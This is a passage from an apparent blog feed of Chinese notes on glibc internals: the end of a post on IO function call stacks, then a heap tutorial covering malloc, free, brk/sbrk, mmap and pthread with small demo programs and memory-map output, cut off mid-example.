class="number">0x7f6117f5639a</span> _IO_file_xsputn+<span class="number">426</span></span><br><span class="line">  f <span class="number">3</span>   <span class="number">0x7f6117f2cfa4</span> buffered_vfprintf+<span class="number">308</span></span><br><span class="line">  f <span class="number">4</span>   <span class="number">0x7f6117f2a33d</span> <span class="built_in">vfprintf</span>+<span class="number">445</span></span><br><span class="line">  f <span class="number">5</span>   <span class="number">0x7f6117f328a9</span> <span class="built_in">printf</span>+<span class="number">153</span></span><br></pre></td></tr></table></figure><h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><p>调用栈与fwrite大致相同</p><p>至于fclose由于本菜鸡懒得写了，参考<a href="https://ixout.github.io/posts/33400/">file函数学习 | ixout’s blog</a>学长的博客哈哈哈</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IO函数详解&quot;&gt;&lt;a href=&quot;#IO函数详解&quot; class=&quot;headerlink&quot; title=&quot;IO函数详解&quot;&gt;&lt;/a&gt;IO函数详解&lt;/h1&gt;&lt;p&gt;该版本为libc-2.31&lt;/p&gt;
&lt;h2 id=&quot;fopen&quot;&gt;&lt;a href=&quot;#fopen&quot; clas</summary>
      
    
    
    
    <category term="Pwn知识" scheme="http://s1nec-1o.github.io/categories/Pwn%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>heap note</title>
    <link href="http://s1nec-1o.github.io/2024/02/29/heap-note/"/>
    <id>http://s1nec-1o.github.io/2024/02/29/heap-note/</id>
    <published>2024-02-29T10:20:14.000Z</published>
    <updated>2024-04-28T14:12:47.224Z</updated>
    
    <content type="html"><![CDATA[<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>本篇文章摘自华庭大佬的<code>Glibc 内存管理</code>一书，只是插入了一些记录</p><h4 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h4><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。</p><p>堆管理器处于用户程序与内核中间，主要做以下工作</p><ol><li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li><li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li></ol><p>Linux 中早期的堆分配与回收由 Doug Lea 实现，但它在并行处理多个线程时，会共享进程的堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁。然而，与此同时，加锁会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是 ptmalloc 。在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。</p><p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc&#x2F;free 函数来分配和释放内存块。</p><p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p><h3 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h3><p>这里我们主要介绍</p><ul><li>基本的堆操作，包括堆的分配，回收，堆分配背后的系统调用</li><li>介绍堆目前的多线程支持。</li></ul><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p>在 glibc 的 <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448">malloc.c</a> 中，malloc 的说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">malloc函数用于分配至少n个字节大小的内存块，并返回指向该内存块的指针。如果没有足够的空间可用，则返回空指针。在失败的情况下，对于 ANSI C 系统，errno 会被设置为 ENOMEM。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如果 n 为零，则malloc返回一个最小尺寸的内存块。在大多数 32 位系统上，最小尺寸为 16 个字节，在 64 位系统上为 24 或 32 个字节。在大多数系统中，size_t 是无符号类型，因此带有负参数的调用会被解释为对大量空间的请求，通常会失败。n 的最大支持值因系统而异，但在所有情况下都小于 size_t 可表示的最大值</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以看出，malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理</p><ul><li>当 n&#x3D;0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>在 glibc 的 <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465">malloc.c</a> 中，free 的说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      free(void* p)</span></span><br><span class="line"><span class="comment">      Releases the chunk of memory pointed to by p, that had been previously</span></span><br><span class="line"><span class="comment">      allocated using malloc or a related routine such as realloc.</span></span><br><span class="line"><span class="comment">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span></span><br><span class="line"><span class="comment">      effects if p has already been freed.</span></span><br><span class="line"><span class="comment">      Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">      when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">      back unused memory to the system, thus reducing program footprint.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">释放指向p的内存块，该内存块之前使用malloc或类似的realloc例程分配。如果p为null，则没有影响。如果p已经被释放，可能会产生任意（即不好的）影响。除非禁用（使用mallopt），释放非常大的空间将在可能的情况下自动触发操作，将未使用的内存返回给系统，从而减少程序占用空间。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以看出，free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p><p>此外，该函数也同样对异常情况进行了处理</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li></ul><h4 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h4><p>在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> 函数以及 <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> 函数。</p><p>如下图所示，我们主要考虑对堆进行申请内存块的操作。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212586.png" alt="img"></p><h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 <a href="https://en.wikipedia.org/wiki/Sbrk">brk</a> 的大小来向操作系统申请内存。</p><p>初始时，堆的起始地址 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">start_brk</a> 以及堆的当前末尾 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a> 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data&#x2F;bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的随机偏移处。</li></ul><p>具体效果如下图（这个图片与网上流传的基本一致，这里是因为要画一张大图，所以自己单独画了下）所示</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212587.png" alt="img"></p><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid()); <span class="comment">//输出当前进程的PID（进程标识符）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);  <span class="comment">//使用 sbrk(0) 获取当前程序堆区的边界</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);        <span class="comment">// 调用 brk(curr_brk+4096) 来将程序的堆区边界地址向上移动 4096 字节（4KB）。brk 函数设置新的 break 的位置。</span></span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);  <span class="comment">//调用 brk(tmp_brk) 将程序的堆区边界重置回最初的位置</span></span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，在每一次执行完操作后，都执行了 getchar() 函数，这是为了我们方便我们查看程序真正的映射。</p><p><strong>在第一次调用 brk 之前</strong></p><p>从下面的输出可以看出，并没有出现堆。因此</p><ul><li>start_brk &#x3D; brk &#x3D; end_data &#x3D; 0x804b000</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:<span class="number">6141</span></span><br><span class="line">Program Break Location1:<span class="number">0x804b000</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="number">6141</span>/maps</span><br><span class="line">...</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539624</span>     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line">b7e21000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p><strong>第一次增加 brk 后</strong></p><p>从下面的输出可以看出，已经出现了堆段</p><ul><li>start_brk &#x3D; end_data &#x3D; 0x804b000</li><li>brk &#x3D; 0x804c000</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:<span class="number">6141</span></span><br><span class="line">Program Break Location1:<span class="number">0x804b000</span></span><br><span class="line">Program Break Location2:<span class="number">0x804c000</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="number">6141</span>/maps</span><br><span class="line">...</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539624</span>     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0804</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</span><br><span class="line">b7e21000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p>其中，关于堆的那一行</p><ul><li>0x0804b000 是相应堆的起始地址</li><li>rw-p 表明堆具有可读可写权限，并且属于隐私数据。</li><li>00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为 0。</li><li>00:00 是主从 (Major&#x2F;mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为 0。</li><li>0 表示着 Inode 号。由于这部分内容并不是从文件中映射得到的，所以为 0。</li></ul><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>malloc 会使用 <a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285">mmap</a> 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Private anonymous mapping example using mmap syscall */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="type">static</span> <span class="keyword">inline</span> <span class="title function_">errExit</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="type">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="type">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">                errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unmap mapped region. */</span></span><br><span class="line">        ret = munmap(addr, (<span class="type">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">                errExit(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After munmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在执行 mmap 之前</strong></p><p>我们可以从下面的输出看到，目前只有. so 文件的 mmap 段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="number">6067</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p><strong>mmap 后</strong></p><p>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了 b7e00000 到 b7e21000 的 mmap 段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="number">6067</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e00000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><p><strong>munmap</strong></p><p>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="number">6067</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure><h4 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h4><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p><p>这里给出一个例子。</p><p><code>pthread_create</code> 是一个函数，用于在 POSIX 线程库中创建一个新的线程。</p><p>函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr,</span></span><br><span class="line"><span class="params">                   <span class="type">void</span> *(*start_routine) (<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>thread</code>：指向 <code>pthread_t</code> 类型的指针，用于存储新创建线程的标识符。</li><li><code>attr</code>：指向 <code>pthread_attr_t</code> 类型的指针，用于指定线程的属性。可以传递 <code>NULL</code>，表示使用默认属性。</li><li><code>start_routine</code>：指向线程函数的指针，该函数是线程的入口点，线程将从该函数开始执行。</li><li><code>arg</code>：传递给线程函数 <code>start_routine</code> 的参数。</li></ul><p>返回值：</p><ul><li>如果成功创建线程，则返回 0，表示成功。</li><li>如果创建线程失败，则返回一个非零的错误码，表示失败的原因。</li></ul><p><code>pthread_create</code> 函数用于创建一个新的线程，并在指定的线程函数 <code>start_routine</code> 中执行。新线程的执行将从 <code>start_routine</code> 函数开始，该函数接受一个 <code>void*</code> 类型的参数 <code>arg</code>。线程函数可以执行任意操作，包括计算、I&#x2F;O 操作、同步等。</p><p>使用 <code>pthread_create</code> 创建的线程在执行完毕后，可以通过调用 <code>pthread_join</code> 函数来等待线程的结束，并获取线程的返回值。此外，还可以使用其他线程相关的函数来管理和操作线程，例如 <code>pthread_detach</code>、<code>pthread_cancel</code> 等。</p><p>需要注意的是，<code>pthread_create</code> 函数是 POSIX 标准中定义的线程创建函数，在不同的操作系统和编译器中可能有所差异。在使用时，应仔细阅读相关文档并遵循相应的使用规范。</p><p><code>pthread_join</code> 是一个函数，用于等待指定的线程结束，并获取线程的返回值。</p><p>函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_join</span><span class="params">(<span class="type">pthread_t</span> thread, <span class="type">void</span> **retval)</span>;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>thread</code>：要等待的线程标识符，通常由 <code>pthread_create</code> 返回。</li><li><code>retval</code>：指向 <code>void*</code> 类型指针的指针，用于存储线程的返回值。</li></ul><p>返回值：</p><ul><li>如果成功等待线程结束，则返回 0，表示成功。</li><li>如果等待线程失败，则返回一个非零的错误码，表示失败的原因。</li></ul><p><code>pthread_join</code> 函数用于等待指定的线程结束。当调用该函数时，当前线程将被阻塞，直到被等待的线程执行完毕。在线程结束后，可以通过 <code>retval</code> 参数获取线程的返回值，该返回值是线程函数 <code>start_routine</code> 的返回值。</p><p>需要注意的是，如果线程被成功等待并成功获取返回值，那么线程的资源将被释放，不再占用系统资源。但是，如果不关心线程的返回值，可以将 <code>retval</code> 参数设置为 <code>NULL</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 